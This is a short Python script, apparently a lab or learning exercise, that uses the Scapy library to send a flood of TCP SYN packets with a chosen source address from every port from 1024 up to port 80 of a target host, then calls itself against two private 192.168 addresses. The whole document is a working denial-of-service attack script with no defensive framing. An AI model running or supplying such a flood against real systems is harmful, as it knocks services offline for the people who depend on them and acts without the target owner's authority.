#! /usr/bin/env python
from scapy.all import *

def sendSynFlood(sourceIP,targetIP):
    for sourcePort in range(1024,65535):
        Layer3 = IP(src=sourceIP,dst=targetIP)
        Layer4 = TCP(sport=sourcePort, dport=80)
        packet = Layer3/Layer4
        send(packet)

sendSynFlood("192.168.62.20","192.168.40.50")
